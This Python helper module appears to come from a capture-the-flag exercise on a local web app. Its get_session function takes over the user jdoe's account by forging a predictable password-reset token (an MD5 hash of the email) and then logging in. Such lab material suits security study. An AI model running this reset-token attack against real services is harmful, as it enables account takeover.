#!/usr/bin/env python3
# shared helpers, imported by each exploit.py
import os
import re
import pathlib
import hashlib
import requests

TARGET = os.environ.get("TARGET", "http://localhost:4942")


def say(msg):
    print(f"\n=== {msg} ===")


# a requests session that already knows the target and some defaults.
# we never follow redirects, so we see the 302 and its Location ourselves (like curl).
class Client(requests.Session):
    def request(self, method, path, **kw):
        kw.setdefault("timeout", 5)
        kw["allow_redirects"] = False
        url = path if path.startswith("http") else TARGET + path
        return super().request(method, url, **kw)


# first FLAG{...} in a string, or None
def find_flag(text):
    m = re.search(r"FLAG\{[^}]+\}", text)
    return m.group(0) if m else None


# plain md5 hex of a string (used for the reset token and a few hints)
def md5(s):
    return hashlib.md5(s.encode()).hexdigest()


# log in as jdoe and return a Client that carries the session cookie.
# the reset token is just md5(email), so we reset the password to a known one
# first, then log in. this way it works even on a fresh vm.
def get_session(email="jdoe@student.42.tech", password="111111"):
    c = Client()
    c.post("/reset-password/confirm",
           data={"email": email, "token": md5(email), "new_password": password})
    c.post("/login", data={"identity": email, "password": password})
    return c


# save the flag in a file next to the exploit that found it.
# pass __file__ from the caller so it lands in the right folder.
def save_flag(flag, script_file):
    path = pathlib.Path(script_file).resolve().parent / "flag"
    path.write_text(flag + "\n")
    print(f"[+] saved flag to {path}")
